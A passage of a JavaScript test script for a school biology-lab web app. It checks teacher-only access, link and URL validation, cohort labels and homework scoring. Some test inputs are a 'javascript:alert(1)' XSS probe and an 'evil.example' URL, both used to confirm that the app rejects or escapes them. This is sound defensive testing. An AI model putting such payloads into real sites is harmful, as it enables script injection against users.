    ['Reflection spreadsheets', 'Test <b>7</b>', 'https://docs.google.com/spreadsheets/d/SECRET-ID/edit', 'a "note" & more'],
    ['Records', 'Bad link', 'javascript:alert(1)', ''],
    ['Records', 'Not a link', 'docs.google.com/x', '']]);
  const page = (who) => { VISITOR = who; return doGet({ parameter: { page: 'teachers' } }).html; };
  [['', 'nobody'], ['pupil@pupils.x.kr', 'a pupil'], ['other@x.kr', 'unlisted staff']].forEach(([who, label]) => {
    const h = page(who);
    if (/SECRET-ID|docs\.google\.com|Test &lt;b&gt;7/.test(h)) throw new Error(label + ' was shown a link');
  });
  /* The links now reach the page through uiData rather than being baked into the served HTML,
     so prove it there — and prove the same door is shut to a pupil. */
  VISITOR = OWNER;
  const d0 = uiData('teachers');
  if (!d0.ok) throw new Error('the owner was refused the links: ' + d0.why);
  const flat = JSON.stringify(d0.data);
  if (!/SECRET-ID/.test(flat)) throw new Error('the owner was not given the link');
  if (/javascript:/.test(flat) || /Not a link/.test(flat) || /Bad link/.test(flat)) throw new Error('a non-https row was handed over');
  VISITOR = 'pupil@pupils.x.kr';
  if (uiData('teachers').ok !== false) throw new Error('a pupil was handed the links through uiData');
  VISITOR = OWNER;
  if (String(doGet({ parameter: {} })) !== 'Biology Labs endpoint is running.') throw new Error('the health check changed');
  VISITOR = ''; SCHOOL_DOMAIN = ''; props.delete('SCHOOL_DOMAIN');
  ss.deleteSheet(tab);
});

console.log('— the teacher-page control panel —');
ok &= run('add teachers and links from the dialog, read live, no code edit', () => {
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  [T_TEACHERS, T_LINKS].forEach(n => { const t = ss.getSheetByName(n); if (t) ss.deleteSheet(t); });
  let d = teacherPanelData();
  if (!d.ok || d.owner !== OWNER) throw new Error('panel refused the owner: ' + JSON.stringify(d).slice(0,120));
  d = teacherAddTeacher('Dr Colleague', 'Colleague@X.kr ');
  if (!d.teachers.some(t => t.email === 'colleague@x.kr' && t.name === 'Dr Colleague')) throw new Error('teacher not added');
  if (!_isTeacher_('colleague@x.kr')) throw new Error('the added teacher is not recognised by _isTeacher_');
  if (teacherAddTeacher('Oops', 'pupil@pupils.x.kr').ok !== false) throw new Error('a pupil address was accepted as a teacher');
  if (teacherAddTeacher('again', 'colleague@x.kr').ok !== false) throw new Error('a duplicate teacher was accepted');
  d = teacherAddLink({ type: 'Reflection', assessment: 'Topic 7 · Digestion', grad: '2028', url: 'https://docs.google.com/spreadsheets/d/AAA/edit', note: 'the digestion test' });
  const mine = d.links.filter(l => /AAA/.test(l.url))[0];
  if (!mine || mine.assessment !== 'Topic 7 · Digestion' || mine.grad !== '2028' || mine.type !== 'Reflection') throw new Error('link stored wrong: ' + JSON.stringify(mine));
  if (!mine.cohort || mine.cohort.title !== 'Class of 2028') throw new Error('cohort label wrong: ' + JSON.stringify(mine.cohort));
  if (teacherAddLink({ type: 'Reflection', assessment: 'x', url: 'not a url' }).ok !== false) throw new Error('a bad link was accepted');
  if (teacherSetPageUrl('https://evil.example/exec').ok !== false) throw new Error('a non-webapp url was accepted');
  d = teacherSetPageUrl('https://script.google.com/a/macros/x.kr/s/AKfyP/exec');
  if (!d.pageLive || props.get('TEACHER_PAGE_URL') !== 'https://script.google.com/a/macros/x.kr/s/AKfyP/exec') throw new Error('page url not saved');
  /* the links reach the page through uiData now, not baked into the served HTML */
  const got = JSON.stringify(uiData('teachers').data);
  if (!/AAA/.test(got)) throw new Error('the link did not reach the owner');
  if (!/Topic 7 · Digestion/.test(got) || !/Class of 2028/.test(got)) throw new Error('the assessment/cohort did not reach the page');
  d = teacherRemoveLink(mine.row);
  if (d.links.some(l => /AAA/.test(l.url))) throw new Error('link not removed');
  d = teacherRemoveTeacher('colleague@x.kr');
  if (d.teachers.some(t => t.email === 'colleague@x.kr')) throw new Error('teacher not removed');
  if (_isTeacher_('colleague@x.kr')) throw new Error('_isTeacher_ still recognises a removed teacher');
});
ok &= run('an old 4-column links tab is migrated, the misaligned row put right', () => {
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  [T_TEACHERS, T_LINKS].forEach(n => { const t = ss.getSheetByName(n); if (t) ss.deleteSheet(t); });
  const old = ss.insertSheet(T_LINKS);
  // the old shape, exactly as the first version made it
  old.getRange(1, 1, 2, 4).setValues([
    ['Section', 'Name', 'Link', 'Note'],
    ['Records', 'Student Progress Tracker', 'https://docs.google.com/spreadsheets/d/TRK/edit', 'Every cohort'],
  ]);
  // a row added by the new dialog into the old tab: 6 values spilling to column E (Daniel's case)
  old.getRange(3, 1, 1, 5).setValues([['Reflection', 'Topic 7 - Human Nutrition', '2026', 'Topic 7 - Human Nutrition',
    'https://docs.google.com/spreadsheets/d/HN/edit?gid=1#gid=1']]);
  const d = teacherPanelData();                       // opening the panel migrates the tab
  const hdr = ss.getSheetByName(T_LINKS).getRange(1, 1, 1, 6).getValues()[0].map(x => String(x).replace(/^✎\s*/, '').trim());
  if (hdr.join(',') !== 'Type,Assessment,Graduation year,Name,Link,Note') throw new Error('headers not migrated: ' + hdr.join(','));
  const hn = d.links.filter(l => /HN/.test(l.url))[0];
  if (!hn || hn.type !== 'Reflection' || hn.assessment !== 'Topic 7 - Human Nutrition' || hn.grad !== '2026')
    throw new Error('the misaligned row was not fixed: ' + JSON.stringify(hn));
  const trk = d.links.filter(l => /TRK/.test(l.url))[0];
  if (!trk || trk.type !== 'Records' || trk.assessment !== 'Student Progress Tracker')
    throw new Error('the old seed row was not migrated: ' + JSON.stringify(trk));
  // a fresh add now lands aligned
  const d2 = teacherAddLink({ type: 'Test', assessment: 'X', grad: '2027', url: 'https://docs.google.com/spreadsheets/d/NEW/edit' });
  const nw = d2.links.filter(l => /NEW/.test(l.url))[0];
  if (!nw || nw.grad !== '2027' || nw.type !== 'Test') throw new Error('a new add after migration is misaligned: ' + JSON.stringify(nw));
  // idempotent: a second open changes nothing
  const before = ss.getSheetByName(T_LINKS).getLastRow();
  teacherPanelData();
  if (ss.getSheetByName(T_LINKS).getLastRow() !== before) throw new Error('re-migration changed the row count');
});
ok &= run('the cohort label: graduation year is the anchor, the year group rolls forward', () => {
  const sep26 = new Date(2026, 8, 15), sep27 = new Date(2027, 8, 15);
  const a = _cohortLabel_('2028', sep26);
  if (!a || a.title !== 'Class of 2028' || a.yearGroup !== 'Y10' || a.academic !== '2026–27') throw new Error('2028 in 2026: ' + JSON.stringify(a));
  if (_cohortLabel_('2027', sep26).yearGroup !== 'Y11') throw new Error('2027 should be Y11 in 2026');
  if (_cohortLabel_('2029', sep26).yearGroup !== 'Y9') throw new Error('2029 should be Y9 in 2026');
  if (_cohortLabel_('2028', sep27).yearGroup !== 'Y11') throw new Error('the same 2028 cohort should be Y11 a year later');
  if (_cohortLabel_('Class of 2028', sep26).yearGroup !== 'Y10') throw new Error('a "Class of 2028" string was not parsed');
  if (_cohortLabel_('2040', sep26).yearGroup !== '') throw new Error('a far-off year should show no year group');
  if (_cohortLabel_('', sep26) !== null) throw new Error('no year should be null');
});
ok &= run('the page organises: records pinned, YOUNGEST cohort first, types in order', () => {
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  [T_TEACHERS, T_LINKS].forEach(n => { const t = ss.getSheetByName(n); if (t) ss.deleteSheet(t); });
  teacherPanelData();
  teacherAddLink({ type:'Survey',     assessment:'End of unit survey', grad:'2028', url:'https://x/survey' });
  teacherAddLink({ type:'Test',       assessment:'Topic 7 test',       grad:'2028', url:'https://x/test' });
  teacherAddLink({ type:'Reflection', assessment:'Topic 7 reflection', grad:'2028', url:'https://x/refl' });
  teacherAddLink({ type:'Reflection', assessment:'Topic 1 reflection', grad:'2027', url:'https://x/y11' });
  teacherAddLink({ type:'Records',    assessment:'Tracker',            grad:'',     url:'https://x/trk' });
  const g = _teacherPageGroups_(new Date(2026, 8, 15));
  if (!g.records.some(r => /trk/.test(r.url))) throw new Error('the record was not pinned to Records');
  /* Y9 first, then Y10, then Y11 — a younger cohort graduates LATER, so furthest year first */
  if (g.cohorts.map(c => c.grad).join(',') !== '2028,2027') throw new Error('cohorts not youngest-year-group first: ' + g.cohorts.map(c => c.grad));
  const c2028 = g.cohorts.filter(c => c.grad === 2028)[0];
  if (c2028.yearGroup !== 'Y10') throw new Error('cohort year group wrong: ' + c2028.yearGroup);
  if (c2028.types.map(t => t.type).join(',') !== 'Reflection,Test,Survey') throw new Error('types not in reading order: ' + c2028.types.map(t => t.type));
  [T_TEACHERS, T_LINKS].forEach(n => { const t = ss.getSheetByName(n); if (t) ss.deleteSheet(t); });
  VISITOR = ''; SCHOOL_DOMAIN = ''; props.delete('SCHOOL_DOMAIN');
});
ok &= run('classes list in YEAR order, not alphabetical', () => {
  /* sorted as plain text, "10A" and "11A" both come before "9A" — so every dropdown put Y10 and
     Y11 ahead of Y9, which is the opposite of how the school reads a list */
  const got = ['11A', '9B', '10A', '9A', '10B'].slice().sort(_byClass_).join(',');
  if (got !== '9A,9B,10A,10B,11A') throw new Error('classes came out as ' + got);
  if (['9A', '10A'].slice().sort().join(',') !== '10A,9A') throw new Error('the plain sort should still be wrong — the test is not proving anything');
});
ok &= run('the panel refuses a student / web-app caller', () => {
  VISITOR = 'stu@pupils.x.kr';
  if (teacherPanelData().ok !== false) throw new Error('panel data leaked to a student');
  if (teacherAddTeacher('x', 'x@x.kr').ok !== false) throw new Error('a student added a teacher');
  if (teacherAddLink({ url: 'https://docs.google.com/x' }).ok !== false) throw new Error('a student added a link');
  if (teacherSetPageUrl('https://script.google.com/a/macros/x.kr/s/AK/exec').ok !== false) throw new Error('a student set the url');
  VISITOR = ''; SCHOOL_DOMAIN = '';
  props.delete('TEACHER_PAGE_URL'); props.delete('SCHOOL_DOMAIN');
  [T_TEACHERS, T_LINKS].forEach(n => { const t = ss.getSheetByName(n); if (t) ss.deleteSheet(t); });
});

console.log('— lab progress & the student finder —');
const SEP26 = new Date(2026, 8, 15);
ok &= run('per-station strings parse, and shrug off junk', () => {
  const s = _parseStations_('mouth 8/8 in 11 · stomach 5/6 in 3 · liver 0/4');
  if (s.length !== 3) throw new Error('parsed ' + s.length);
  if (s[0].name !== 'mouth' || s[0].done !== 8 || s[0].total !== 8 || s[0].checks !== 11) throw new Error('mouth wrong: ' + JSON.stringify(s[0]));
  if (s[1].checks !== 3 || s[2].checks !== 0) throw new Error('checks wrong: ' + JSON.stringify(s));
  if (_parseStations_('').length !== 0) throw new Error('empty should be nothing');
  if (_parseStations_('no numbers here').length !== 0) throw new Error('junk should be nothing');
});
ok &= run('a class name becomes its graduation cohort', () => {
  const a = _classCohort_('10A', SEP26);
  if (!a || a.grad !== 2028 || a.yearGroup !== 'Y10') throw new Error('10A: ' + JSON.stringify(a));
  if (_classCohort_('9B', SEP26).grad !== 2029) throw new Error('9B should graduate 2029');
  if (_classCohort_('11A', SEP26).yearGroup !== 'Y11') throw new Error('11A should be Y11');
  if (_classCohort_('staff', SEP26) !== null) throw new Error('a class with no year should be null');
});
ok &= run('lab progress reads the marks — labs, roster, per-student entries, no email leak', () => {
  const data = _labProgressData_(SEP26);
  if (!data.labs.some(l => l.id === 'digestion-lab')) throw new Error('Digestion is not among the live labs');
  if (!data.students.length) throw new Error('no students');
  data.students.forEach(s => { if ('email' in s) throw new Error('a raw email leaked into the lab-progress payload'); });
  const withDig = data.students.filter(s => s.byLab['digestion-lab']);
  if (!withDig.length) throw new Error('nobody has a Digestion entry, though hand-ins were recorded');
  const e = withDig[0].byLab['digestion-lab'];
  if (typeof e.pct !== 'number' || typeof e.done !== 'number' || typeof e.total !== 'number' || !Array.isArray(e.stations))
    throw new Error('entry shape wrong: ' + JSON.stringify(e));
  if (JSON.stringify(data.classes) !== JSON.stringify(data.classes.slice().sort())) throw new Error('classes not sorted');
});
ok &= run('the student directory lists the roster with emails, cohorts, sorted', () => {
  const dir = _studentDirectory_(SEP26);
  if (!dir.students.length) throw new Error('the directory is empty');
  const s = dir.students[0];
  if (!s.email || s.email.indexOf('@') < 0) throw new Error('a directory row has no email');
  if (!('cohort' in s)) throw new Error('no cohort field');
  const key = x => (x.cls || '') + ' ' + (x.name || '');
  const sorted = dir.students.slice().sort((a, b) => key(a).localeCompare(key(b)));
  if (JSON.stringify(dir.students.map(key)) !== JSON.stringify(sorted.map(key))) throw new Error('not sorted by class then name');
});
ok &= run('the tracker address is validated, kept, and builds per-pupil links', () => {
  props.delete('TRACKER_APP_URL'); TRACKER_APP_URL = '';
  if (_trackerAppUrl_() !== '') throw new Error('an unset tracker url was not empty');
  if (_studentTrackerUrl_('a@x.kr') !== '') throw new Error('a link was built with no base');
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  if (teacherSetTrackerUrl('https://evil.example/exec').ok !== false) throw new Error('a non-Google url was accepted');
  const set = teacherSetTrackerUrl('https://script.google.com/a/macros/x.kr/s/AKtrack/exec');
  if (!set.ok || !set.trackerLive) throw new Error('a good tracker url was refused: ' + JSON.stringify(set).slice(0, 120));
  if (_studentTrackerUrl_('A@X.kr') !== 'https://script.google.com/a/macros/x.kr/s/AKtrack/exec?page=student&email=a%40x.kr')
    throw new Error('per-pupil link wrong: ' + _studentTrackerUrl_('A@X.kr'));
  TEACHER_PAGE_URL = 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec';
  if (_pageUrl_('progress') !== 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec?page=progress') throw new Error('progress url: ' + _pageUrl_('progress'));
  if (_pageUrl_('students') !== 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec?page=students') throw new Error('students url: ' + _pageUrl_('students'));
  VISITOR = 'stu@pupils.x.kr';
  if (teacherSetTrackerUrl('https://script.google.com/a/macros/x.kr/s/AK/exec').ok !== false) throw new Error('a student set the tracker url');
  VISITOR = ''; SCHOOL_DOMAIN = '';
  props.delete('TRACKER_APP_URL'); props.delete('TEACHER_PAGE_URL'); props.delete('SCHOOL_DOMAIN');
  TEACHER_PAGE_URL = '';
});
ok &= run('lab-progress and students pages show data to a teacher, the door to everyone else', () => {
  SCHOOL_DOMAIN = 'x.kr';
  TEACHER_PAGE_URL = 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec';
  props.set('TRACKER_APP_URL', 'https://script.google.com/a/macros/x.kr/s/AKtrack/exec');
  ['progress', 'students'].forEach(page => {
    VISITOR = ''; const nobody = doGet({ parameter: { page } }).html;
    if (!/school Google account/.test(nobody)) throw new Error(page + ': signed-out visitor not sent to sign in');
    VISITOR = 'pupil@pupils.x.kr'; const pupil = doGet({ parameter: { page } }).html;
    if (/@x\.kr|AKtrack/.test(pupil)) throw new Error(page + ': a pupil was shown roster data or a tracker address');
    if (!/not on its list/.test(pupil)) throw new Error(page + ': a pupil did not get the refusal page');
    VISITOR = OWNER; const teacher = doGet({ parameter: { page } }).html;
    if (/__DATA__/.test(teacher)) throw new Error(page + ': the data placeholder was left unfilled');
    if (!/Lab progress|Students/.test(teacher)) throw new Error(page + ': the page did not render for a teacher');
  });
  VISITOR = ''; SCHOOL_DOMAIN = ''; TEACHER_PAGE_URL = '';
  props.delete('TRACKER_APP_URL'); props.delete('TEACHER_PAGE_URL'); props.delete('SCHOOL_DOMAIN');
});

console.log('— setting homework —');
global.MANIFEST_JSON = JSON.stringify({ generated:'t', labs: { 'digestion-lab': {
  name:'Digestion', questions:123,
  stations:[ {id:'mouth',name:'Mouth and teeth',questions:8}, {id:'stomach',name:'Stomach',questions:9} ] } } });
HUB_URL = 'https://hub.test';
const hwStations = (email, str) => {
  const sh = ss.getSheetByName('Digestion'), n = sh.getLastRow() - 1;
  const v = sh.getRange(2, 1, n, LAB_EMAIL).getValues();
  for (let i = 0; i < n; i++) {
    if (String(v[i][LAB_EMAIL - 1]).toLowerCase() === email) { sh.getRange(i + 2, 14).setValue(str); return true; }
  }
  return false;
};
let hwWho = '';
ok &= run('the homework tab is made, with a readable set of headings', () => {
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  const sh = _ensureHomeworkTab_();
  const head = sh.getRange(1, 1, 1, _HW_HEADERS_.length).getValues()[0]
                 .map(h => String(h || '').replace(/^✎\s*/, '').trim());
  if (JSON.stringify(head) !== JSON.stringify(_HW_HEADERS_)) throw new Error('headings are ' + head.join(','));
});
ok &= run('a pupil cannot set or remove homework', () => {
  VISITOR = 'pupil@pupils.x.kr';
  if (homeworkCreate({ title:'x' }).ok !== false) throw new Error('a pupil set homework');
  if (homeworkDelete('HW-XXXXX').ok !== false) throw new Error('a pupil removed homework');
  if (homeworkRefresh().ok !== false) throw new Error('a pupil read the homework data');
  VISITOR = OWNER;
});
ok &= run('homework refuses to be half-written', () => {
  const task = [{ labId:'digestion-lab', stationIds:['mouth'] }];
  if (homeworkCreate({ title:'', tasks:task, targets:{cls:'9A'}, due:'2026-09-30' }).ok !== false) throw new Error('no title accepted');
  if (homeworkCreate({ title:'t', tasks:[], targets:{cls:'9A'}, due:'2026-09-30' }).ok !== false) throw new Error('no stations accepted');
  if (homeworkCreate({ title:'t', tasks:task, targets:{}, due:'2026-09-30' }).ok !== false) throw new Error('nobody to set it for accepted');
  if (homeworkCreate({ title:'t', tasks:task, targets:{cls:'9A'} }).ok !== false) throw new Error('no due date accepted');
});
ok &= run('setting homework writes ONE row, and writes it in words', () => {
  const dir = _studentDirectory_(); hwWho = dir.students[0] ? dir.students[0].email : '';
  if (!hwWho) throw new Error('no students to set it for');
  const cls = dir.students[0].cls;
  const before = _homeworkRows_().length;
  const r = homeworkCreate({ title:'Gut practice', due:'2026-09-30T23:59:00',
    targets:{ cls: cls }, tasks:[{ labId:'digestion-lab', stationIds:['mouth','stomach'] }] });
  if (!r.ok) throw new Error('refused: ' + r.why);
  const rows = _homeworkRows_();
  if (rows.length !== before + 1) throw new Error('wrote ' + (rows.length - before) + ' rows');
  const hw = rows[rows.length - 1];
  if (!/^HW-/.test(hw.id)) throw new Error('no id: ' + hw.id);
  if (hw.teacher !== OWNER) throw new Error('not attributed to the teacher who set it');
  /* the readable column must name the stations, not their ids — the tab has to mean
     something opened on its own */
  if (!/Mouth and teeth/.test(hw.what) || !/Stomach/.test(hw.what)) throw new Error('What reads "' + hw.what + '"');
  if (hw.tasks[0].stationIds.join(',') !== 'mouth,stomach') throw new Error('spec did not round-trip');
});
ok &= run('a station never opened counts as nothing done — it does not vanish', () => {
  /* the pupil reached mouth only. stomach must still be in the denominator, or a pupil who
     did a third of the work would read as having done all of it. */
  if (!hwStations(hwWho, 'mouth 8/8 in 11')) throw new Error('no Digestion row for ' + hwWho);
  const hw = _homeworkRows_().pop();
  const s = _hwScoreOne_(hw, hwWho, _hwLabIndex_(['digestion-lab']), _manifest_());
  if (s.total !== 17) throw new Error('denominator is ' + s.total + ', should be 8 + 9');
  if (s.done !== 8) throw new Error('done is ' + s.done);
  if (s.state !== 'partly') throw new Error('state is ' + s.state);
  if (s.missing.length) throw new Error('nothing should be missing');
});
ok &= run('all of it done reads as done', () => {
  hwStations(hwWho, 'mouth 8/8 in 11 · stomach 9/9 in 3');
  const hw = _homeworkRows_().pop();
  const s = _hwScoreOne_(hw, hwWho, _hwLabIndex_(['digestion-lab']), _manifest_());
  if (s.done !== 17 || s.state !== 'done') throw new Error(JSON.stringify(s));
});
ok &= run('a station the lab no longer has is named, never quietly scored zero', () => {
  const r = homeworkCreate({ title:'Old shape', due:'2026-09-30T23:59:00',
    targets:{ cls:_studentDirectory_().students[0].cls },
    tasks:[{ labId:'digestion-lab', stationIds:['mouth','ghost-station'] }] });
  if (!r.ok) throw new Error('refused: ' + r.why);
  const hw = _homeworkRows_().pop();
  const s = _hwScoreOne_(hw, hwWho, _hwLabIndex_(['digestion-lab']), _manifest_());
  if (s.missing.indexOf('ghost-station') < 0) throw new Error('the vanished station was not named');
  if (s.total !== 8) throw new Error('a station that no longer exists was scored: total ' + s.total);
});
ok &= run('a lab whose tab has gone is named, not scored nought for everyone', () => {
  /* the tab vanishing and the tab being empty must not look the same: one is "cannot be marked",
     the other is "nobody has done it". Scoring a vanished lab nought accuses the whole class. */
  const keep = MANIFEST_JSON;
  MANIFEST_JSON = JSON.stringify({ generated:'t', labs: Object.assign(JSON.parse(keep).labs, {
    'ghost-lab': { name:'Ghost', questions:5, stations:[{id:'g1',name:'Gone',questions:5}] } }) });
  try { CacheService.getScriptCache().put('STATIONS_MANIFEST', MANIFEST_JSON, 60); } catch (e) {}
  const r = homeworkCreate({ title:'Vanished lab', due:'2026-09-30T23:59:00',
    targets:{ cls:_studentDirectory_().students[0].cls },
    tasks:[{ labId:'ghost-lab', stationIds:['g1'] }] });
  if (!r.ok) throw new Error('refused: ' + r.why);
  const hw = _homeworkRows_().pop();
  const s2 = _hwScoreOne_(hw, hwWho, _hwLabIndex_(['ghost-lab']), _manifest_());
  if (s2.missing.indexOf('g1') < 0) throw new Error('the unmarkable station was not named');
  if (s2.total !== 0) throw new Error('a lab with no tab was still scored: total ' + s2.total);
  if (s2.state === 'none' && s2.total > 0) throw new Error('reported as not-started rather than unmarkable');
  homeworkDelete(hw.id);
  MANIFEST_JSON = keep;
  try { CacheService.getScriptCache().put('STATIONS_MANIFEST', keep, 60); } catch (e) {}
});
ok &= run('one go can set the same practice for several classes, each with its own date', () => {
  const dir = _studentDirectory_(), cls = dir.students[0].cls;
  const other = (dir.classes.filter(c => c !== cls)[0]) || cls;
  const before = _homeworkRows_().length;
  const r = homeworkCreate({ title:'Parallel sets', tasks:[{ labId:'digestion-lab', stationIds:['mouth'] }],
    classes:[ { cls: cls,   due:'2026-09-25T23:59:00' },
              { cls: other, due:'2026-09-29T23:59:00' } ] });
  if (!r.ok) throw new Error('refused: ' + r.why);
  if (r.made.length !== 2) throw new Error('made ' + r.made.length + ' rows, wanted one per class');
  const rows = _homeworkRows_();
  if (rows.length !== before + 2) throw new Error('wrote ' + (rows.length - before) + ' rows');
  const mine = rows.slice(-2);
  /* one row per class is also what Google Classroom needs: coursework belongs to one course */
  if (mine[0].who === mine[1].who) throw new Error('both rows went to the same class');
  if (String(mine[0].due) === String(mine[1].due)) throw new Error('both rows share a due date');
  if (!mine[0].group || mine[0].group !== mine[1].group) throw new Error('the two rows are not grouped together');
  if (JSON.stringify(mine[0].tasks) !== JSON.stringify(mine[1].tasks)) throw new Error('the two rows set different work');
  /* and one bad date must stop the whole thing, not write half of it */
  const half = _homeworkRows_().length;
  const bad = homeworkCreate({ title:'Half', tasks:[{ labId:'digestion-lab', stationIds:['mouth'] }],
    classes:[ { cls: cls, due:'2026-09-25T23:59:00' }, { cls: other, due:'' } ] });
  if (bad.ok !== false) throw new Error('a missing date was accepted');
  if (_homeworkRows_().length !== half) throw new Error('it wrote some rows before giving up');
  mine.forEach(x => homeworkDelete(x.id));
});
ok &= run('homework can be removed again', () => {
  const rows = _homeworkRows_(), last = rows[rows.length - 1];
  const r = homeworkDelete(last.id);
  if (!r.ok) throw new Error('refused: ' + r.why);
  if (_homeworkRows_().some(x => x.id === last.id)) throw new Error('it is still there');
  if (homeworkDelete('HW-NOPE').ok !== false) throw new Error('removing nothing said yes');
});
ok &= run('one teacher cannot quietly remove another teacher’s homework', () => {
  const dir = _studentDirectory_();
  const r = homeworkCreate({ title:'Mine', due:'2026-09-30T23:59:00',
    targets:{ cls:dir.students[0].cls }, tasks:[{ labId:'digestion-lab', stationIds:['mouth'] }] });
  if (!r.ok) throw new Error('refused: ' + r.why);
  const id = r.made[0];
  /* a different teacher on the list tries to remove it */
  TEACHERS = 'colleague@x.kr'; VISITOR = 'colleague@x.kr';
  const no = homeworkDelete(id);
  if (no.ok !== false) throw new Error('a colleague removed somebody else’s homework');
  if (!/Only they|owner/i.test(no.why || '')) throw new Error('the refusal does not say why: ' + no.why);
  /* the owner always can */
  VISITOR = OWNER;
  if (homeworkDelete(id).ok !== true) throw new Error('the owner could not remove it');
  TEACHERS = ''; props.delete('TEACHERS');
});
ok &= run('a pupil moving 9A → 10C → 11C keeps their homework, and their cohort never moves', () => {
  /* the normal path through this school: same pupil, new year group and often a new class each
     September. Their email is the identity and the graduation year is the cohort, so both the
     record and the retention rule must survive the move. */
  SCHOOL_DOMAIN = 'x.kr'; VISITOR = OWNER;
  const me = _studentDirectory_().students[0];
  const stu = ss.getSheetByName('Students'), ec = _emailCol_(stu);
  const vals = stu.getRange(2, 1, stu.getLastRow() - 1, ec).getValues();
  let row = -1;
  for (let i = 0; i < vals.length; i++) if (_cleanEmail_(vals[i][ec - 1]) === me.email) row = i + 2;
  if (row < 0) throw new Error('no roster row for ' + me.email);
  const original = String(stu.getRange(row, 2).getValue());
  const setClass = c => stu.getRange(row, 2).setValue(c);
  const mine = id => _hwPupils_(_homeworkRows_().filter(x => x.id === id)[0], _studentDirectory_().students)
                       .filter(p => p.email === me.email).length;
  try {
    setClass('9A');
    const r = homeworkCreate({ title:'Year 9 practice', classes:[{ cls:'9A', due:'2027-03-01T23:59:00' }],
      tasks:[{ labId:'digestion-lab', stationIds:['mouth'] }] });
    if (!r.ok) throw new Error('refused: ' + r.why);
    const id = r.made[0];
    const first = _homeworkRows_().filter(x => x.id === id)[0];
    if (!first.setFor || first.setFor.indexOf(me.email) < 0) throw new Error('it did not record who it was set for');
    const cohort = first.cohort;
    if (!cohort) throw new Error('no cohort was recorded');
    if (!mine(id)) throw new Error('not attached even before the move');

    setClass('10C');
    if (_homeworkRows_().filter(x => x.id === id)[0].cohort !== cohort)
      throw new Error('the cohort changed when the class did');
    if (!mine(id)) throw new Error('lost their homework on moving 9A -> 10C');

    setClass('11C');
    if (!mine(id)) throw new Error('lost their homework on moving 10C -> 11C');
    if (_homeworkRows_().filter(x => x.id === id)[0].cohort !== cohort)
      throw new Error('the cohort drifted over two moves');

    /* and the other half: homework set for 11C BEFORE they arrived must not reach back for them */
    setClass('9A');
    const r2 = homeworkCreate({ title:'Eleven C only', classes:[{ cls:'11C', due:'2027-03-01T23:59:00' }],
      tasks:[{ labId:'digestion-lab', stationIds:['mouth'] }] });
    if (!r2.ok) throw new Error('refused: ' + r2.why);
    setClass('11C');
    if (mine(r2.made[0])) throw new Error('moving into 11C dragged them into homework set before they arrived');
    homeworkDelete(id); homeworkDelete(r2.made[0]);
  } finally { setClass(original); }
});
ok &= run('the Set homework page is teacher-only', () => {
  VISITOR = ''; const nobody = doGet({ parameter:{ page:'homework' } }).html;
  if (!/school Google account/.test(nobody)) throw new Error('a signed-out visitor was not sent to sign in');
  VISITOR = 'pupil@pupils.x.kr'; const pupil = doGet({ parameter:{ page:'homework' } }).html;
  if (/Gut practice|@x\.kr/.test(pupil)) throw new Error('a pupil saw homework or roster data');
  VISITOR = OWNER; const teacher = doGet({ parameter:{ page:'homework' } }).html;
  if (/__DATA__/.test(teacher)) throw new Error('the data placeholder was left unfilled');
  if (!/Set .?homework|Set homework/.test(teacher)) throw new Error('the page did not render for a teacher');
});
ok &= run('with no hub address there is no station list, and it says so rather than guessing', () => {
  HUB_URL = ''; props.delete('HUB_URL');
  if (_manifest_() !== null) throw new Error('a manifest appeared from nowhere');
  const d = _homeworkData_();
  if (d.hubSet !== false || d.manifestOk !== false) throw new Error('it claimed to know the labs');
  if (d.labs.length) throw new Error('labs were offered with no station list');
  HUB_URL = 'https://hub.test';
});
{ const t = ss.getSheetByName(T_HOMEWORK); if (t) ss.deleteSheet(t); }
VISITOR = ''; SCHOOL_DOMAIN = ''; HUB_URL = ''; MANIFEST_JSON = '';
props.delete('HUB_URL'); props.delete('SCHOOL_DOMAIN');

const st = ss.getSheetByName('Students');
console.log('Students: ' + (st.getLastRow() - 1) + ' rows × ' + st.getLastColumn() + ' cols');
const dg = ss.getSheetByName('Digestion');
const filled = dg ? dg.getRange(2, 3, dg.getLastRow() - 1, 1).getValues().filter(r => r[0] !== '').length : 0;
console.log('Digestion: ' + (dg ? dg.getLastRow() - 1 : 0) + ' student(s), ' + filled + ' handed in');
const rj = ss.getSheetByName('Rejected');
console.log('Rejected:  ' + (rj ? rj.getLastRow() - 1 : 0) + ' row(s)');
process.exit(ok ? 0 : 1);
